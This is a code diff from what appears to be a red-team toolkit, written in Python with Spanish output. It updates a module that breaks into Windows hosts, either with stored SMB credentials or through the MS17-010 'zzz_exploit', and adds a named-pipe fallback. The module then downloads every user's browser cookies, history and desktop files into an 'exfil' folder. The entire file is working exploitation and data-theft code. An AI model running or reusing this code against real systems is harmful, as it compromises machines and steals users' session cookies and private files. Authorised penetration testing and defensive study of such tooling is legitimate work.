@@ -2,95 +2,181 @@ import os
 import sys
 
 sys.path.append(
-    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+    os.path.dirname(
+        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    )
 )
 
-from config.settings import TARGET_IP
+from config.settings import OS_CONFIGS, seleccionar_os
 from Agentes.Red.Herramientas.ms17_010_checker import check_vulnerability
 
 EXTRACT_DIR = os.path.join(
-    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))),
-    "Telemetria", "exfil"
+    os.path.dirname(
+        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    ),
+    "Telemetria",
+    "exfil",
 )
+EXFIL_MANIFEST = os.path.join(EXTRACT_DIR, ".exfil_manifest.txt")
 
 
-def _download_file(smb_conn, share, remote_path, local_path):
+def _write_manifest(files):
+    with open(EXFIL_MANIFEST, "w") as f:
+        for path in files:
+            f.write(path + "\n")
+
+
+def _download_file(conn, share, remote_path, local_path):
     try:
         os.makedirs(os.path.dirname(local_path), exist_ok=True)
         with open(local_path, "wb") as f:
-            smb_conn.getFile(share, remote_path, f.write)
+            conn.getFile(share, remote_path, f.write)
         size = os.path.getsize(local_path)
-        print(f"  [✅] {remote_path} ({size} bytes)")
-        return True
+        print(f"  [\u2705] {remote_path} ({size} bytes)")
+        return True, local_path
     except Exception as e:
-        print(f"  [❌] {remote_path}: {e}")
-        return False
+        print(f"  [\u274c] {remote_path}: {e}")
+        return False, None
 
 
-def _list_users(smb_conn):
+def _list_users(conn, os_name):
     users = []
+    base = "Documents and Settings" if "XP" in os_name else "Users"
     try:
-        for entry in smb_conn.listPath("C$", "Documents and Settings\\*"):
+        for entry in conn.listPath("C$", f"{base}\\*"):
             name = entry.get_longname()
-            if name not in (".", "..", "All Users", "Default User", "LocalService", "NetworkService"):
+            if name not in (
+                ".",
+                "..",
+                "All Users",
+                "Default User",
+                "Default",
+                "LocalService",
+                "NetworkService",
+                "Public",
+            ):
                 users.append(name)
     except Exception:
         users.append("Administrator")
     return users
 
 
-def _extraction_session(conn, pipe_name, share, mode):
-    print("\n[*] Obteniendo acceso SMB como SYSTEM...")
-    smb_conn = conn.get_smbconnection()
+def _user_paths_for_os(os_name):
+    cfg = OS_CONFIGS[os_name]
+    base = cfg["USER_PATH"]
+    return {
+        "base": base,
+        "cookies": f"{base}\\{cfg['COOKIES_REL']}",
+        "history": f"{base}\\{cfg['HISTORY_REL']}",
+        "desktop": f"{base}\\{cfg['DESKTOP_REL']}",
+    }
 
-    print("[*] (Saltando reg save - congela Windows XP)")
-    print("[*] Extrayendo solo archivos accesibles vía SMB...")
 
-    print("\n[*] Listando usuarios...")
-    users = _list_users(smb_conn)
-    print(f"  → {', '.join(users) if users else 'ninguno'}")
+def _download_user_data(conn, paths, os_name, smb_user=""):
+    print("[*] Extrayendo datos de usuario vía SMB...")
+    users = _list_users(conn, os_name)
+    if smb_user and smb_user not in users:
+        users.append(smb_user)
+    print(f"  \u2192 {', '.join(users) if users else 'ninguno'}")
 
-    print("\n[*] Extrayendo datos de usuario...")
+    downloaded = []
     for user in users:
         user_dir = os.path.join(EXTRACT_DIR, "users", user)
-        for base in [
-            f"Documents and Settings\\{user}\\Cookies\\",
-            f"Documents and Settings\\{user}\\Local Settings\\History\\",
-            f"Documents and Settings\\{user}\\Desktop\\",
-        ]:
+        for key in ("cookies", "history", "desktop"):
+            base_dir = paths[key]
+            remote = base_dir.replace("{user}", user) + "\\*"
             try:
-                for entry in smb_conn.listPath("C$", base + "*"):
+                entries = conn.listPath("C$", remote)
+                for entry in entries:
                     name = entry.get_longname()
                     if name in (".", "..") or entry.is_directory():
                         continue
-                    _download_file(smb_conn, "C$", base + name, os.path.join(user_dir, name))
-            except Exception:
-                pass
+                    ok, local = _download_file(
+                        conn,
+                        "C$",
+                        base_dir.replace("{user}", user) + "\\" + name,
+                        os.path.join(user_dir, name),
+                    )
+                    if ok and local:
+                        downloaded.append(f"{user}/{key}/{name}")
+            except Exception as e:
+                print(f"  [\u274c] {user} | {key}: {e}")
 
-    print(f"\n[+] Archivos guardados en: {EXTRACT_DIR}")
+    _write_manifest(downloaded)
+    print(f"\n[+] Archivos guardados en: {EXTRACT_DIR} ({len(downloaded)} archivos)")
 
 
-def ejecutar_extraccion():
+def _extract_direct(target_ip, smb_user, smb_pass, paths, os_name):
+    """Extrae archivos usando credenciales directamente (sin exploit)."""
+    from impacket import smbconnection
+
+    print("[*] Conectando vía SMB con credenciales...")
+    conn = smbconnection.SMBConnection(target_ip, target_ip)
+    conn.login(smb_user, smb_pass)
+    _download_user_data(conn, paths, os_name, smb_user)
+    conn.logoff()
+    return True
+
+
+def ejecutar_extraccion(os_name=None):
+    if os_name is None:
+        from config.settings import OS_CHOICE
+
+        os_name = OS_CHOICE
+
+    os_name = seleccionar_os(os_name)
+    cfg = OS_CONFIGS[os_name]
+    paths = _user_paths_for_os(os_name)
+    target_ip = cfg["TARGET_IP"]
+    smb_user = cfg["SMB_USER"]
+    smb_pass = cfg["SMB_PASS"]
     os.makedirs(EXTRACT_DIR, exist_ok=True)
-    print(f"📁 Destino: {EXTRACT_DIR}\n")
+    print(f"[*] SO: {os_name}")
+    print(f"[*] Destino: {EXTRACT_DIR} @ {target_ip}\n")
 
-    checker = check_vulnerability(TARGET_IP)
+    # Si hay credenciales, extraer directamente sin exploit
+    if smb_user:
+        _extract_direct(target_ip, smb_user, smb_pass, paths, os_name)
+        print("[✅] Extracción completada.")
+        return
+
+    # Sin credenciales: intentar vía MS17-010
+    checker = check_vulnerability(target_ip)
     if not checker["vulnerable"]:
         print("[❌] Target no vulnerable.")
         return
-    if not checker["pipes"]:
-        print("[❌] Sin named pipes.")
-        return
 
-    pipe = checker["pipes"][0]
+    COMMON_PIPES = [
+        "spoolss",
+        "samr",
+        "browser",
+        "lsarpc",
+        "srvsvc",
+        "netlogon",
+        "wkssvc",
+    ]
+    if checker["pipes"]:
+        pipe = checker["pipes"][0]
+    else:
+        print("[*] Enumeración anónima no disponible. Probando pipes comunes...")
+        pipe = COMMON_PIPES[0]
+        print(f"[*] Usando pipe por defecto: {pipe}")
+
     print(f"[+] Target: {checker['target_os']} | Pipe: {pipe}")
 
     from Agentes.Red.Herramientas import zzz_exploit as _ze
+
+    def _extraction_session(conn, pipe_name, share, mode):
+        print("\n[*] Obteniendo acceso SMB como SYSTEM...")
+        smb_conn = conn.get_smbconnection()
+        print("[*] (Saltando reg save - congela Windows XP)")
+        _download_user_data(smb_conn, paths, os_name, smb_user)
+
     _original = _ze.do_system_mysmb_session
     _ze.do_system_mysmb_session = _extraction_session
 
     try:
-        _ze.exploit(TARGET_IP, 445, "", "", pipe, "C$", "SHARE")
+        _ze.exploit(target_ip, 445, smb_user, smb_pass, pipe, "C$", "SHARE")
     except KeyboardInterrupt:
         print("\n[!] Interrumpido.")
     finally:
